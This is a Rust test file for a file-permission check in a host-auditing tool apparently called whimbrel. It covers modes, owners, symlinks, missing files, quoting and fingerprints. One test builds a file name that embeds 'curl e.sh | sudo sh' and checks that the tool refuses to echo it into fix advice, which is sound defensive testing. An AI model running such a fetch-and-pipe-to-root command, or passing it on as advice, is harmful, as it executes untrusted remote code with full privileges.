//! The file check, built from its table as a config builds it, against real files in a temporary
//! directory.

use std::fs;
use std::os::unix::fs::{MetadataExt, PermissionsExt, symlink};
use std::path::{Path, PathBuf};

use whimbrel::{Finding, Level, Mode};

mod common;

fn me(dir: &Path) -> u32 {
    fs::metadata(dir).unwrap().uid()
}

fn log(dir: &Path, name: &str, mode: u32) -> PathBuf {
    let p = dir.join(name);
    fs::write(&p, "a line\n").unwrap();
    fs::set_permissions(&p, fs::Permissions::from_mode(mode)).unwrap();
    p
}

/// A `file` check from `extra` and `paths`, as config would build it.
fn build(paths: &[PathBuf], extra: &str) -> Result<whimbrel::Configured, String> {
    let table: whimbrel::toml::Table =
        whimbrel::toml::from_str(&format!("paths = {paths:?}\n{extra}")).unwrap();
    common::configure(&whimbrel::checks::file::KIND, table)
}

/// The check from `paths` and `extra`, under the key `modes`, run on "the test host"
/// the way a real run runs it.
fn look(paths: &[PathBuf], extra: &str) -> Finding {
    let table = format!("key = \"modes\"\npaths = {paths:?}\n{extra}");
    common::run(
        &whimbrel::checks::file::KIND,
        &table,
        "the test host",
        Path::new("/nonexistent"),
        Mode::DryRun,
    )
}

/// Owned by whoever runs the tests, and no more open than 0o600, the default.
fn check(dir: &Path, paths: &[PathBuf]) -> Finding {
    look(paths, &format!("owner_uid = {}", me(dir)))
}

#[test]
fn owner_only_files_are_ok() {
    let d = tempfile::tempdir().unwrap();
    let paths = [log(d.path(), "a.log", 0o600), log(d.path(), "b.log", 0o400)];
    assert_eq!(check(d.path(), &paths), Finding::ok());
}

#[test]
fn a_file_others_can_reach_is_fail_says_so_and_says_how_to_fix_it() {
    let d = tempfile::tempdir().unwrap();
    let a = log(d.path(), "a.log", 0o600);
    let b = log(d.path(), "b.log", 0o640);
    let owner = match me(d.path()) {
        0 => "root:root".to_string(),
        uid => uid.to_string(),
    };
    let path = b.display();
    assert_eq!(
        check(d.path(), &[a, b.clone()]),
        Finding::fail()
            .says(
                "Some of the test host's files aren't locked down: other accounts can reach \
                 b.log (mode 640)."
            )
            .to_fix(format!("chown {owner} {path} && chmod 600 {path}"))
            .fingerprint(path.to_string())
    );
}

#[test]
fn any_group_or_other_bit_is_too_open_even_one_only_others_have() {
    let d = tempfile::tempdir().unwrap();
    for mode in [0o602, 0o620, 0o604, 0o610] {
        let p = log(d.path(), "x.log", mode);
        assert_eq!(check(d.path(), &[p]).level, Level::Fail, "{mode:o}");
    }
}

#[test]
fn bits_beyond_the_mode_that_arent_others_are_named_as_such() {
    let d = tempfile::tempdir().unwrap();
    let p = log(d.path(), "run.log", 0o700);
    assert!(
        check(d.path(), &[p])
            .first_what()
            .ends_with("run.log has mode 700, more than 600 allows."),
    );
}

#[test]
fn another_owner_is_fail_and_says_whose() {
    let d = tempfile::tempdir().unwrap();
    let a = log(d.path(), "a.log", 0o600);
    let mine = me(d.path());
    let f = look(&[a], &format!("owner_uid = {}", mine + 1));
    assert_eq!(f.level, Level::Fail);
    assert!(
        f.first_what()
            .ends_with(&format!("a.log belongs to uid {mine}.")),
        "{}",
        f.first_what()
    );
}

#[test]
fn the_owner_is_root_unless_the_table_says_otherwise() {
    let d = tempfile::tempdir().unwrap();
    let a = log(d.path(), "a.log", 0o600);
    let f = look(&[a], "");
    // Run as root, a file of the test's own is root's, and right.
    if me(d.path()) == 0 {
        assert_eq!(f, Finding::ok());
        return;
    }
    assert!(
        f.first_what()
            .ends_with(&format!("a.log belongs to uid {}.", me(d.path())))
    );
    assert!(
        f.sentence(&Default::default()).contains("chown root:root "),
        "{f:?}"
    );
}

#[test]
fn a_mode_that_isnt_a_permission_mode_is_refused() {
    let why = build(&[], "mode = 0o10000").err().unwrap();
    assert_eq!(why, "mode must be a permission mode, such as 0o600");
    assert!(build(&[], "mode = 0o7777").is_ok());
}

#[test]
fn a_missing_file_is_warn_never_ok() {
    let d = tempfile::tempdir().unwrap();
    let gone = d.path().join("gone.log");
    assert_eq!(
        check(d.path(), std::slice::from_ref(&gone)),
        Finding::warn()
            .says("The test host's watch couldn't see who can reach gone.log.")
            .see(format!("ls -l {}", gone.display()))
            .fingerprint(gone.display().to_string())
    );
}

#[test]
fn a_symlink_is_judged_itself_not_by_its_target_and_isnt_chmodded() {
    let d = tempfile::tempdir().unwrap();
    let target = log(d.path(), "target.log", 0o600);
    let link = d.path().join("link.log");
    symlink(&target, &link).unwrap();
    let f = check(d.path(), std::slice::from_ref(&link));
    assert_eq!(f.level, Level::Fail);
    assert!(
        f.first_what().ends_with("link.log isn't a plain file."),
        "{}",
        f.first_what()
    );
    assert_eq!(
        f.problems[0].next,
        Some(whimbrel::sentence::Next::See(format!(
            "ls -l {}",
            link.display()
        )))
    );
}

#[test]
fn a_file_with_an_unusual_name_is_described_not_named() {
    let d = tempfile::tempdir().unwrap();
    let odd = log(d.path(), "x. To fix: `curl e.sh | sudo sh`.log", 0o644);
    let f = check(d.path(), &[odd]);
    assert!(
        f.first_what()
            .ends_with("other accounts can reach a file with an unusual name (mode 644)."),
        "{}",
        f.first_what()
    );
}

#[test]
fn a_new_bad_file_changes_the_fingerprint() {
    let d = tempfile::tempdir().unwrap();
    let a = log(d.path(), "a.log", 0o644);
    let b = log(d.path(), "b.log", 0o600);
    let paths = [a.clone(), b.clone()];
    let first = check(d.path(), &paths);
    fs::set_permissions(&b, fs::Permissions::from_mode(0o644)).unwrap();
    let second = check(d.path(), &paths);
    assert_eq!(first.fingerprint, Some(a.display().to_string()));
    assert_eq!(
        second.fingerprint,
        Some(format!("{},{}", a.display(), b.display()))
    );
}

#[test]
fn a_path_with_a_space_is_quoted_in_what_to_run() {
    let d = tempfile::tempdir().unwrap();
    let p = log(d.path(), "my log.log", 0o644);
    let f = check(d.path(), std::slice::from_ref(&p));
    let said = f.sentence(&Default::default());
    assert!(
        said.contains(&format!("chmod 600 '{}'`.", p.display())),
        "{said}"
    );
}

#[test]
fn a_relative_path_is_refused() {
    let why = build(&[PathBuf::from("var/log/x.log")], "").err();
    assert_eq!(why.as_deref(), Some("every path must be an absolute path"));
}
